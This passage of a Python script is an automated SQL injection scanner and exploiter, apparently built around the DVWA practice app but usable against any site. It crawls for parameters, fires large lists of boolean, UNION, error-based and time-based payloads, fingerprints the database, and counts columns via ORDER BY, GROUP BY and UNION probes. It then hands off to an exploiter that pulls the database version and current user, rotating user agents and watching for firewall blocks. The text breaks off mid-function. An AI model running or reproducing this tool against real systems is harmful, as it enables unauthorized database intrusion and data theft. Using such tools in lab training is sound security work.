#!/usr/bin/env python3
import os
import random
import string
import re
import json
import time
import difflib
import logging
import sys
import math
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, unquote_plus
import requests
from bs4 import BeautifulSoup

# ===========================
# Config and Colors
# ===========================
@dataclass
class Config:
    timeout: int = 10
    delay: float = 0.5
    max_depth: int = 2
    union_max_cols: int = 20
    time_based_threshold: float = 4.0
    similarity_threshold: float = 0.92
    use_cookies: bool = True
    thread_char_extract: Optional[int] = None

class Colors:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD_MAGENTA = "\033[1;95m"
    CYAN = "\033[96m"
    RESET = "\033[0m"

# ===========================
# Debug Utilities
# ===========================
DEBUG = False
def info(msg: str) -> None:
    print(f"{Colors.GREEN}[*] {msg}{Colors.RESET}")
def warn(msg: str) -> None:
    print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")
def error(msg: str) -> None:
    print(f"{Colors.RED}[-] {msg}{Colors.RESET}")
def good(msg: str) -> None:
    print(f"{Colors.BOLD_MAGENTA}[+] {msg}{Colors.RESET}")
def diag(msg: str) -> None:
    print(f"{Colors.CYAN}[*] {msg}{Colors.RESET}")
def debug(msg: str) -> None:
    if DEBUG:
        print(f"{Colors.CYAN}[DEBUG]{Colors.RESET} {msg}")

# ===========================
# Helpers
# ===========================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def save_json(folder: str, name: str, obj: dict) -> None:
    path = os.path.join(folder, name)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2, ensure_ascii=False)
    info(f"Saved: {path}")

def same_domain(a: str, b: str) -> bool:
    return urlparse(a).netloc == urlparse(b).netloc

def normalize_url(u: str) -> str:
    pr = urlparse(u)
    qs = parse_qs(pr.query, keep_blank_values=True)
    sorted_qs = urlencode({k: v[0] if v else "" for k, v in sorted(qs.items())})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, sorted_qs, ""))

def pretty_url(u: str) -> str:
    return unquote_plus(u)

# ===========================
# HTTP Client
# ===========================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
]
DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}
class HttpClient:
    def __init__(self, timeout: int = 10, delay: float = 0.5, use_cookies: bool = True):
        self.session = requests.Session()
        self.timeout = timeout
        self.delay = delay
        self.use_cookies = use_cookies
        if not use_cookies:
            self.session.cookies.clear()
    def login_dvwa(self, base_url: str, username="admin", password="password", security="low") -> bool:
        login_url = f"{base_url.rstrip('/')}/login.php"
        security_url = f"{base_url.rstrip('/')}/security.php"
        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })
        try:
            resp = self.session.get(login_url, timeout=self.timeout)
            debug(f"Login page status: {resp.status_code}")
            token_match = re.search(r"name='user_token' value='([^']+)'", resp.text)
            user_token = token_match.group(1) if token_match else ""
            debug(f"CSRF token found: {bool(token_match)}")
        except Exception as e:
            error(f"Could not fetch DVWA login page: {e}")
            return False
        data = {
            "username": username,
            "password": password,
            "Login": "Login",
            "user_token": user_token
        }
        try:
            resp = self.session.post(login_url, data=data, timeout=self.timeout, allow_redirects=True)
            debug(f"Login response URL: {resp.url}")
            debug(f"Login response status: {resp.status_code}")
            if "login.php" in resp.url.lower():
                warn("DVWA login failed — check credentials or CSRF token")
                error_match = re.search(r'<p class="error">(.*?)</p>', resp.text, re.IGNORECASE)
                if error_match:
                    warn(f"Login error: {error_match.group(1)}")
                return False
        except Exception as e:
            error(f"DVWA login request failed: {e}")
            return False
        try:
            sec_resp = self.session.get(security_url, timeout=self.timeout)
            token_match = re.search(r"name='user_token' value='([^']+)'", sec_resp.text)
            user_token = token_match.group(1) if token_match else ""
            data = {"security": security, "seclev_submit": "Submit", "user_token": user_token}
            self.session.post(security_url, data=data, timeout=self.timeout, allow_redirects=True)
            good(f"DVWA login successful, security set to '{security}'")
            return True
        except Exception as e:
            error(f"Could not set DVWA security: {e}")
            return False
    def get(self, url: str) -> Optional[requests.Response]:
        time.sleep(self.delay)
        headers = DEFAULT_HEADERS.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)
        debug(f"HTTP GET -> {pretty_url(url)}")
        debug(f"Headers: {headers}")
        try:
            response = self.session.get(
                url, headers=headers, timeout=self.timeout, allow_redirects=True
            )
            debug(f"Status: {response.status_code} | len(body)= {len(response.text)} | content-type= {response.headers.get('Content-Type')}")
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            if e.response is not None and e.response.status_code == 403:
                warn(f"Access denied (403) for {pretty_url(url)} — try adjusting headers or cookies")
            else:
                error(f"HTTP Error: {e} for {pretty_url(url)}")
        except requests.exceptions.Timeout:
            error(f"Timeout occurred for {pretty_url(url)}")
        except requests.exceptions.RequestException as e:
            error(f"Request failed: {pretty_url(url)} ({e})")
        return None

# ===========================
# Crawling
# ===========================
@dataclass
class CrawlResult:
    url: str
    params: List[str] = field(default_factory=list)
class Crawler:
    def __init__(self, base_url: str, depth: int = 2, client: Optional[HttpClient] = None):
        self.base_url = base_url.rstrip("/")
        self.depth = max(1, depth)
        self.client = client or HttpClient()
        self.visited: Set[str] = set()
        self.endpoints: Dict[str, Set[str]] = {}
    def run(self) -> List[CrawlResult]:
        info(f"Starting crawl on: {self.base_url}")
        self._crawl(self.base_url, self.depth)
        results: List[CrawlResult] = []
        for u, params in self.endpoints.items():
            results.append(CrawlResult(u, sorted(list(params))))
        debug(f"Crawl discovered {len(results)} endpoints with params")
        return results
    def _crawl(self, url: str, depth: int) -> None:
        url = normalize_url(url)
        if depth <= 0 or url in self.visited:
            debug(f"Skipping (visited/depth): {url} (depth= {depth})")
            return
        self.visited.add(url)
        resp = self.client.get(url)
        if not resp or "text/html" not in (resp.headers.get("Content-Type") or ""):
            debug(f"Non-HTML or no response: {url}")
            return
        soup = BeautifulSoup(resp.text, "html.parser")
        pr = urlparse(url)
        if pr.query:
            params = list(parse_qs(pr.query, keep_blank_values=True).keys())
            self.endpoints.setdefault(url, set()).update(params)
            info(f"Found endpoint: {url} -> {params}")
        for a in soup.find_all("a", href=True):
            href = a["href"]
            nxt = urljoin(url, href)
            if not same_domain(nxt, self.base_url):
                continue
            link_pr = urlparse(nxt)
            if link_pr.query:
                link_params = list(parse_qs(link_pr.query, keep_blank_values=True).keys())
                self.endpoints.setdefault(nxt, set()).update(link_params)
                info(f"Found link endpoint: {nxt} -> {link_params}")
            self._crawl(nxt, depth - 1)

# ===========================
# Signatures and Payloads
# ===========================
DBMS_SIGNATURES = {
    "MySQL": [
        "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
        "mysql_num_rows", "mysqli", "for the right syntax to use",
    ],
    "PostgreSQL": ["pg_query", "pg_connect", "postgresql", "psql:"],
    "MSSQL": [
        "microsoft odbc", "sql server", "oledbexception", "mssql",
        "unclosed quotation mark after the character string",
    ],
    "Oracle": [r"ora-\d+", "oracle error", "quoted string not properly terminated"],
    "SQLite": ["sqlite error", "sql logic error", "sqlite3"],
}
SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax","warning: mysql",
    "mysql_fetch","mysql_num_rows",
    "mysqli","for the right syntax to use",
    "pg_query","pg_connect",
    "postgresql","psql:",
    "microsoft odbc","sql server",
    "oledbexception","mssql",
    "unclosed quotation mark after the character string",r"ora-\d+",
    "oracle error","quoted string not properly terminated",
    "sqlite error","sql logic error",
    "sqlite3","syntax error",
    "unexpected token","unknown column",
    "table.*doesn't exist","division by zero",
    "violation of.*constraint","conversion failed",
    "incorrect syntax","invalid parameter",
    "argument type","cannot be cast",
    "must be of type","invalid input syntax",
    "type mismatch","wrong number of arguments",
]
BUILTIN_PAYLOADS = [
    "'","''","`","``","\"","\"\"","' OR '1'='1",
    "' OR '1'='1' --","' OR '1'='1' /*","' OR 1=1--","' OR 1=1#",
    "' OR 1=1/*","') OR ('1'='1--","' OR 'a'='a","' OR 'a'='a'--",
    "' OR 'a'='a'/*","\" OR \"\"=\"","\" OR 1=1--","\" OR 1=1#",
    "\" OR 1=1/*","') OR ('1'='1--","' OR SLEEP(5)#","' OR SLEEP(5)/*",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--","' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--","' UNION ALL SELECT NULL,NULL,NULL--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)/*","' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)#","' OR (SELECT * FROM (SELECT(SLEEP(5)))a)/*",
    "' WAITFOR DELAY '0:0:5'--","' WAITFOR DELAY '0:0:5'#","' WAITFOR DELAY '0:0:5'/*",
    "'; WAITFOR DELAY '0:0:5'--","'; WAITFOR DELAY '0:0:5'#","'; WAITFOR DELAY '0:0:5'/*",
    "' AND SLEEP(5)--","' AND SLEEP(5)#","' AND SLEEP(5)/*","' OR SLEEP(5)--",
    "' AND (SELECT SUBSTRING(@@version,1,1))='X'--","' AND (SELECT SUBSTRING(@@version,1,1))='X'#",
    "' AND (SELECT SUBSTRING(@@version,1,1))='X'/*","' OR (SELECT SUBSTRING(@@version,1,1))='X'--",
    "' OR (SELECT SUBSTRING(@@version,1,1))='X'#","' OR (SELECT SUBSTRING(@@version,1,1))='X'/*",
]
DBMS_SPECIFIC_PAYLOADS = {
    "MySQL": {
        "error_based": ["' AND EXTRACTVALUE(1,CONCAT(0x7e,USER(),0x7e))-- -",
                        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"],
        "time_based": ["' AND SLEEP(5)-- -",
                       "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"],
        "boolean_based": ["' OR 1=1-- -", "' OR 'a'='a'"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "PostgreSQL": {
        "error_based": ["' AND CAST((SELECT version()) AS INTEGER)-- -",
                        "' AND 1=CAST((SELECT version()) AS INTEGER)-- -"],
        "time_based": ["' AND (SELECT pg_sleep(5))-- -",
                       "' AND 123=(SELECT 123 FROM pg_sleep(5))-- -"],
        "boolean_based": ["' OR '1'='1'-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "MSSQL": {
        "error_based": ["' AND 1=CONVERT(INT,(SELECT @@version))-- -",
                        "' AND 1=@@version-- -"],
        "time_based": ["' WAITFOR DELAY '0:0:5'-- -",
                       "' IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '0:0:5'-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "Oracle": {
        "error_based": ["' AND (SELECT * FROM (SELECT CTXSYS.DRITHSX.SN(1,(SELECT version FROM v$instance)) FROM dual)) IS NOT NULL-- -"],
        "time_based": ["' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0)>0-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL FROM dual-- -"]
    },
    "SQLite": {
        "error_based": ["' AND load_extension('nonexistent')-- -"],
        "time_based": ["' AND (SELECT randomblob(1000000000))-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "Generic": {
        "error_based": ["'", "''", "`", "``", "\"", "\"\""],
        "time_based": ["' AND 1=0-- -", "' OR IF(1=1,SLEEP(5),0)-- -"],
        "boolean_based": ["' OR '1'='1'", "' OR '1'='0'", "OR 1=1", "OR 1=0"],
        "union_based": ["' UNION SELECT NULL-- -", "' UNION ALL SELECT NULL-- -"]
    }
}
def detect_dbms(html_lower: str) -> Optional[str]:
    for db, sigs in DBMS_SIGNATURES.items():
        for s in sigs:
            if s in html_lower:
                return db
    return None
def apply_payload_to_url(url: str, param: str, payload: str, append: bool = True) -> str:
    pr = urlparse(url)
    qs = parse_qs(pr.query, keep_blank_values=True)
    if param in qs:
        if append:
            cur = qs[param][0] if qs[param] else ""
            qs[param] = [cur + payload]
        else:
            qs[param] = [payload]
    new_query = urlencode({k: v[0] if v else "" for k, v in qs.items()})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, new_query, ""))

# ===========================
# Findings
# ===========================
@dataclass
class Finding:
    url: str
    param: str
    technique: str
    payload: str
    dbms: Optional[str] = None
    severity: str = "Unknown"
    confidence: float = 0.0
    columns: Optional[int] = None
    version: Optional[str] = None
    current_user: Optional[str] = None
    def to_dict(self):
        return {
            "url": self.url, "param": self.param, "technique": self.technique,
            "payload": self.payload, "dbms": self.dbms, "severity": self.severity,
            "confidence": self.confidence, "columns": self.columns,
            "version": self.version, "current_user": self.current_user,
        }

# ===========================
# Scanner
# ===========================
class Scanner:
    def __init__(self, client: Optional[HttpClient] = None, config: Optional[Config] = None):
        self.client = client or HttpClient(timeout=10)
        self.config = config or Config()
        self.findings: List[Finding] = []
        self.enumerated: Set[Tuple[str, str]] = set()
        self.manual_column_count: Optional[int] = None

    def _calculate_severity(self, technique: str, dbms: Optional[str] = None) -> str:
        severity_map = {
            "Union-Based": "High",
            "Error-Based": "High",
            "Time-Based": "Medium",
            "Boolean-Based": "Medium",
        }
        severity = severity_map.get(technique, "High")
        if dbms in ["Oracle", "MSSQL"] and severity == "High":
            severity = "Critical"
        elif dbms in ["MySQL", "PostgreSQL"] and severity == "High":
            severity = "High"
        return severity

    def _calculate_confidence(self, technique: str) -> float:
        confidence_map = {
            "Union-Based": 0.95, "Error-Based": 0.90,
            "Time-Based": 0.85, "Boolean-Based": 0.80,
        }
        return confidence_map.get(technique, 0.75)

    def fingerprint_dbms(self, url: str, param: str) -> Optional[str]:
        debug(f"Fingerprinting DBMS for {url} param= {param}")
        fingerprint_payloads = {
            "MySQL": [
                ("' AND SLEEP(10)-- -", "time"),
                ("' AND (SELECT @@version)-- -", "function"),
                ("' AND (SELECT 'test' RLIKE '^t')-- -", "function"),
            ],
            "PostgreSQL": [
                ("' AND (SELECT pg_sleep(10))-- -", "time"),
                ("' AND (SELECT version())-- -", "function"),
                ("' AND (SELECT 'test' ~ '^t')-- -", "function"),
            ],
            "MSSQL": [
                ("'; WAITFOR DELAY '0:0:10'-- -", "time"),
                ("' AND (SELECT @@version)-- -", "function"),
                ("' AND (SELECT CHAR(65))-- -", "function"),
            ],
            "Oracle": [
                ("' AND (SELECT DBMS_LOCK.SLEEP(10) FROM DUAL)-- -", "time"),
                ("' AND (SELECT banner FROM v$version WHERE rownum=1)-- -", "function"),
                ("' AND (SELECT CHR(65) FROM DUAL)-- -", "function"),
            ],
            "SQLite": [
                ("' AND (SELECT randomblob(1000000000))-- -", "time"),
                ("' AND (SELECT sqlite_version())-- -", "function"),
                ("' AND (SELECT hex('A'))-- -", "function"),
            ]
        }
        baseline_time = self._avg_elapsed(url, n=2)
        debug(f"Baseline avg elapsed: {baseline_time:.3f}s")
        for dbms, payloads in fingerprint_payloads.items():
            for payload, technique in payloads:
                test_url = apply_payload_to_url(url, param, payload, append=True)
                debug(f"[FP] DBMS= {dbms} technique= {technique} payload= {payload} -> {pretty_url(test_url)}")
                if technique == "time":
                    start = time.time()
                    resp = self.client.get(test_url)
                    elapsed = time.time() - start
                    debug(f"[FP] Response {'OK' if resp else 'None'} elapsed= {elapsed:.3f}s")
                    if resp and elapsed >= 4.0:
                        return dbms
                else:
                    resp = self.client.get(test_url)
                    debug(f"[FP] Resp status= {'OK' if resp else 'None'}")
                    if resp and resp.status_code < 500:
                        return dbms
        return None

    def _is_blocked(self, html: str) -> bool:
        BLOCK_INDICATORS = [
            "Cloudflare", "Incapsula", "Akamai", "Imperva", "Barracuda",
            "ModSecurity", "WebKnight", "Sucuri", "SiteLock", "Comodo",
            "403 Forbidden", "Access Denied", "Security Blocked",
            "Your request has been blocked", "Web Application Firewall",
            "Request rejected", "Security violation"
        ]
        DVWA_NORMAL_CONTENT = [
            "login", "csrf", "token", "dvwa", "security", "captcha",
            "phpids", "help", "about", "instructions", "setup", "logout"
        ]
        if not html:
            return False
        html_lower = html.lower()
        block_detected = any(indicator.lower() in html_lower for indicator in BLOCK_INDICATORS)
        dvwa_content = any(indicator in html_lower for indicator in DVWA_NORMAL_CONTENT)
        if block_detected and not dvwa_content:
            debug("WAF/CAPTCHA/Block indicator detected")
            return True
        return False

    def _avg_elapsed(self, url: str, n: int = 2) -> float:
        times = []
        for _ in range(n):
            t0 = time.time()
            _ = self.client.get(url)
            times.append(time.time() - t0)
            time.sleep(0.2)
        avg = sum(times) / len(times) if times else 0.0
        debug(f"Avg elapsed over {n} tries: {avg:.3f}s")
        return avg

    def check_error_based(self, base_html: str, test_html: str) -> Tuple[bool, Optional[str]]:
        test_lower = (test_html or "").lower()
        for e in SQL_ERROR_PATTERNS:
            if e.lower() in test_lower:
                return True, detect_dbms(test_lower)
        db = detect_dbms(test_lower)
        return (db is not None), db

    def check_boolean_based_similarity(self, true_html: str, false_html: str, threshold: float = 0.92) -> bool:
        if not (true_html and false_html):
            return False
        a = re.sub(r"\s+", " ", true_html)
        b = re.sub(r"\s+", " ", false_html)
        ratio = self._similarity_ratio(a, b)
        debug(f"Boolean-based similarity ratio= {ratio:.3f} (threshold= {threshold})")
        return ratio < threshold

    def check_time_based(self, elapsed_sec: float, threshold: float = 4.0) -> bool:
        debug(f"Time-based check elapsed= {elapsed_sec:.3f}s threshold= {threshold}")
        return elapsed_sec >= threshold

    def _similarity_ratio(self, a: str, b: str) -> float:
        if not a or not b:
            return 0.0
        return difflib.SequenceMatcher(None, a, b).ratio()

    def _rand_token(self, n=8) -> str:
        return "X" + "".join(random.choices(string.ascii_uppercase + string.digits, k=n)) + "X"

    def _calculate_average(self, ratios: List[float]) -> float:
        return sum(ratios) / len(ratios) if ratios else 0.0

    def _calculate_stdev(self, ratios: List[float]) -> float:
        if len(ratios) < 2:
            return 0.0
        avg = self._calculate_average(ratios)
        variance = sum((x - avg) ** 2 for x in ratios) / (len(ratios) - 1)
        return math.sqrt(variance)

    def _determine_column_count(self, url: str, param: str, is_numeric_hint: bool, dbms:Optional[str] = None, max_cols: int = 20) -> Optional[int]:
        debug(f"Determining column count for {url} param= {param} (numeric hint: {is_numeric_hint}) up to {max_cols}")
        baseline_resp = self.client.get(url)
        if not baseline_resp:
            return None
        baseline_html = baseline_resp.text

        prefixes_to_test = ["'", ""] if not is_numeric_hint else ["", "'"]

        # === 1. ORDER BY ===
        diag("Attempting to determine column count using ORDER BY")
        for prefix in prefixes_to_test:
            debug(f"Testing ORDER BY with prefix: '{prefix}'")
            for cols in range(1, max_cols + 2):
                order_payload = f"{prefix} ORDER BY {cols}-- -"
                test_url = apply_payload_to_url(url, param, order_payload, append=True)
                debug(f"ORDER BY test cols={cols} -> {pretty_url(test_url)}")
                resp = self.client.get(test_url)
                if not resp:
                    debug(f"No response for ORDER BY {cols} with prefix '{prefix}'")
                    break
                resp_text = resp.text
                resp_lower = resp_text.lower()
                # Known column-related errors
                col_errors = [
                    "unknown column", "invalid column number", "column index out of range",
                    "order by position", "invalid ordinal", "order by clause.*out of range",
                    "unknown column.*in.*order clause", "invalid column name"
                ]
                has_col_error = any(re.search(err, resp_lower, re.IGNORECASE) for err in col_errors)
                generic_errors = [
                    "sql syntax", "syntax error", "mysql server", "postgresql query",
                    "oracle error", "microsoft.*odbc", "odbc.*driver", "sqlserver",
                    "pdoexception", "query failed", "database error"
                ]
                has_generic_error = any(re.search(err, resp_lower, re.IGNORECASE) for err in generic_errors)
                similarity = self._similarity_ratio(baseline_html, resp_text)
                if has_col_error or (has_generic_error and similarity < 0.7):
                    count = cols - 1
                    good(f"Column count via ORDER BY: {count} (prefix='{prefix}')")
                    return count

        # === 2. GROUP BY ===
        diag("ORDER BY inconclusive. Trying GROUP BY method...")
        for prefix in prefixes_to_test:
            debug(f"Testing GROUP BY with prefix: '{prefix}'")
            for cols in range(1, max_cols + 2):
                # Build GROUP BY clause with dummy columns (e.g., 1,2,3...)
                group_list = ",".join(str(i) for i in range(1, cols + 1))
                group_payload = f"{prefix} GROUP BY {group_list}-- -"
                test_url = apply_payload_to_url(url, param, group_payload, append=True)
                debug(f"GROUP BY test cols={cols} -> {pretty_url(test_url)}")
                resp = self.client.get(test_url)
                if not resp:
                    debug(f"No response for GROUP BY {cols} with prefix '{prefix}'")
                    break
                resp_text = resp.text
                resp_lower = resp_text.lower()
                # GROUP BY errors often include "not in SELECT list", "invalid GROUP BY", etc.
                group_errors = [
                    "not in select list", "invalid group by", "must appear in the group by clause",
                    "only full group by", "expression #.* is not in group by",
                    "column.*is invalid in the select list", "group by position"
                ]
                has_group_error = any(re.search(err, resp_lower, re.IGNORECASE) for err in group_errors)
                generic_errors = [
                    "sql syntax", "syntax error", "mysql server", "postgresql query",
                    "oracle error", "microsoft.*odbc", "odbc.*driver", "sqlserver",
                    "pdoexception", "query failed", "database error"
                ]
                has_generic_error = any(re.search(err, resp_lower, re.IGNORECASE) for err in generic_errors)
                similarity = self._similarity_ratio(baseline_html, resp_text)
                # If error appears at `cols`, then max valid is `cols - 1`
                if has_group_error or (has_generic_error and similarity < 0.7):
                    count = cols - 1
                    if count > 0:
                        good(f"Column count via GROUP BY: {count} (prefix='{prefix}')")
                        return count
                    else:
                        break

        # === 3. UNION + Token Reflection ===
        diag("GROUP BY inconclusive. Trying UNION token reflection...")
        for prefix in prefixes_to_test:
            debug(f"Testing UNION token method with prefix: '{prefix}'")
            for count in range(1, max_cols + 1):
                token = self._rand_token(6)
                vals = ["NULL"] * count
                # Try multiple positions: start, middle, end
                positions = [0]
                if count > 1:
                    positions.append(count - 1)
                if count > 2:
                    positions.append(count // 2)
                for pos in positions:
                    vals_copy = vals.copy()
                    vals_copy[pos] = f"'{token}'"
                    if is_numeric_hint and prefix == "":
                        union_payload = f"{prefix}-1 UNION SELECT {','.join(vals_copy)}-- -"
                    else:
                        union_payload = f"{prefix} UNION SELECT {','.join(vals_copy)}-- -"
                    test_url = apply_payload_to_url(url, param, union_payload, append=True)
                    debug(f"UNION test cols={count}, pos={pos} -> {pretty_url(test_url)}")
                    resp = self.client.get(test_url)
                    if resp and token in resp.text:
                        good(f"Column count via UNION token: {count} (prefix='{prefix}', pos={pos})")
                        return count
                # Check for union-specific errors to break early
                if resp:
                    error_detected, _ = self.check_error_based(baseline_html, resp.text)
                    if error_detected and any(kw in resp.text.lower() for kw in ["union", "operand", "column count"]):
                        debug(f"UNION error at {count} columns with prefix '{prefix}' — stopping")
                        break

        warn(f"Could not determine column count up to {max_cols} columns for parameter '{param}'.")
        return None

    def _test_boolean_based(self, url: str, param: str, dbms: Optional[str], numeric_like: bool) -> Optional[Finding]:
        diag(f"Trying Boolean-Based test for parameter '{param}'...")
        contexts = []
        if numeric_like:
            contexts.append(("", " OR 1=1", " AND 1=2"))
            contexts.append(("'", "' OR 1=1", "' AND 1=2"))
        else:
            contexts.append(("'", "' OR 1=1", "' AND 1=2"))
            contexts.append(("", " OR 1=1", " AND 1=2"))
        for prefix, true_condition, false_condition in contexts:
            true_payload = f"{true_condition}-- "
            false_payload = f"{false_condition}-- "
            true_url = apply_payload_to_url(url, param, prefix + true_payload, append=True)
            false_url = apply_payload_to_url(url, param, prefix + false_payload, append=True)
            debug(f"Boolean test with prefix='{prefix}' -> TRUE={pretty_url(true_url)} | FALSE={pretty_url(false_url)}")
            true_resp = self.client.get(true_url)
            false_resp = self.client.get(false_url)
            if true_resp and false_resp and self.check_boolean_based_similarity(true_resp.text, false_resp.text, threshold=0.92):
                good(f"Confirmed Boolean-Based SQLi on {param} with prefix '{prefix}'")
                severity = self._calculate_severity("Boolean-Based", dbms)
                confidence = self._calculate_confidence("Boolean-Based")
                finding = Finding(url, param, "Boolean-Based", prefix + true_payload, dbms, severity, confidence)
                info(f"Attempting to determine the number of columns for parameter '{param}'...")
                if self.manual_column_count is not None:
                    cols = self.manual_column_count
                    info(f"Using manually specified column count: {cols} for parameter '{param}'")
                else:
                    cols = self._determine_column_count(url, param, numeric_like, dbms=dbms, max_cols=20)
                    debug(f"Column count determined: {cols} (calculated once)")
                finding.columns = cols
                if cols:
                    good(f"Determined column count = {cols} for parameter '{param}'")
                else:
                    warn(f"Could not determine column count for '{param}'. Data extraction will use Blind techniques.")
                exploiter = Exploiter(self.client, url, param, dbms, cols, self.config.thread_char_extract)
                finding.version = exploiter.get_version()
                finding.current_user = exploiter.get_current_user()
                return finding
        return None

    def _test_time_based(self, url: str, param: str, dbms: Optional[str], numeric_like: bool) -> Optional[Finding]:
        diag(f"Trying Time-Based test for parameter '{param}'...")
        baseline_avg = self._avg_elapsed(url, n=2)
        time_based_templates = {
            "MySQL": " AND SLEEP({delay})-- -",
            "PostgreSQL": " AND (SELECT pg_sleep({delay}))-- -",
            "MSSQL": "; WAITFOR DELAY '0:0:{delay}'-- -",
            "Oracle": " AND (SELECT COUNT(*) FROM all_users WHERE username='SYS' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})=0)>0-- -",
            "Generic": " AND SLEEP({delay})-- -"
        }
        prefixes_to_test = []
        if numeric_like:
            prefixes_to_test.extend([""])
            prefixes_to_test.append("'")
        else:
            prefixes_to_test.extend(["'"])
            prefixes_to_test.append("")
        for db_candidate, tpl in time_based_templates.items():
            for prefix in prefixes_to_test:
                for delay in [5]:
                    tb_payload = prefix + tpl.format(delay=delay)
                    tb_url = apply_payload_to_url(url, param, tb_payload, append=True)
                    debug(f"Time test -> db={db_candidate} prefix='{prefix}' delay={delay} url={pretty_url(tb_url)}")
                    t0 = time.time()
                    tb_resp = self.client.get(tb_url)
                    elapsed = time.time() - t0
                    debug(f"Time elapsed {elapsed:.2f}s baseline {baseline_avg:.2f}s")
                    if tb_resp and (elapsed - baseline_avg) >= (delay - 1.0):
                        confirm_delay = delay + 2
                        confirm_payload = prefix + tpl.format(delay=confirm_delay)
                        confirm_url = apply_payload_to_url(url, param, confirm_payload, append=True)
                        t1 = time.time()
                        confirm_resp = self.client.get(confirm_url)
                        confirm_elapsed = time.time() - t1
                        debug(f"Confirm elapsed {confirm_elapsed:.2f}s")
                        if confirm_resp and (confirm_elapsed - baseline_avg) >= (confirm_delay - 1.0):
                            dbms = db_candidate
                            good(f"Confirmed Time-Based SQLi on {param} (DBMS suspected: {dbms}) with prefix '{prefix}'")
                            severity = self._calculate_severity("Time-Based", dbms)
                            confidence = self._calculate_confidence("Time-Based")
                            finding = Finding(url, param, "Time-Based", tb_payload, dbms, severity, confidence)
                            info(f"Attempting to determine the number of columns for parameter '{param}'...")
                            if self.manual_column_count is not None:
                                cols = self.manual_column_count
                                info(f"Using manually specified column count: {cols} for parameter '{param}'")
                            else:
                                cols = self._determine_column_count(url, param, numeric_like, dbms=dbms, max_cols=20)
                                debug(f"Column count determined: {cols} (calculated once)")
                            finding.columns = cols
                            if cols:
                                good(f"Determined column count = {cols} for parameter '{param}'")
                            else:
                                warn(f"Could not determine column count for '{param}'. Data extraction will use Blind techniques.")
                            exploiter = Exploiter(self.client, url, param, dbms, cols, self.config.thread_char_extract)
                            finding.version = exploiter.get_version()
                            finding.current_user = exploiter.get_current_user()
                            return finding
        return None

    def _test_error_based(self, url: str, param: str, dbms: Optional[str], numeric_like: bool, selected_payloads: List[str]) -> Optional[Finding]:
        diag(f"Trying Error-Based test for parameter '{param}'...")
        baseline_resp = self.client.get(url)
        baseline_html = baseline_resp.text if baseline_resp is not None else ""
        for payload in selected_payloads:
            test_url = apply_payload_to_url(url, param, payload, append=True)
            debug(f"Error-based test payload= {payload} -> {pretty_url(test_url)}")
            resp = self.client.get(test_url)
            if not resp:
                continue
            eb, db_eb = self.check_error_based(baseline_html, resp.text)
            if eb:
                dbms = detect_dbms(resp.text.lower()) or db_eb or dbms
                good(f"Confirmed Error-Based SQLi on {param} | DBMS: {dbms or 'Unknown'}")
                severity = self._calculate_severity("Error-Based", dbms)
                confidence = self._calculate_confidence("Error-Based")
                finding = Finding(url, param, "Error-Based", payload, dbms, severity, confidence)
                info(f"Attempting to determine the number of columns for parameter '{param}'...")
                if self.manual_column_count is not None:
                    cols = self.manual_column_count
                    info(f"Using manually specified column count: {cols} for parameter '{param}'")
                else:
                    cols = self._determine_column_count(url, param, numeric_like, dbms=dbms, max_cols=20)
                    debug(f"Column count determined: {cols} (calculated once)")
                if cols:
                    finding.columns = cols
                    good(f"Determined column count = {cols} for parameter '{param}'")
                exploiter = Exploiter(self.client, url, param, dbms, cols, self.config.thread_char_extract)
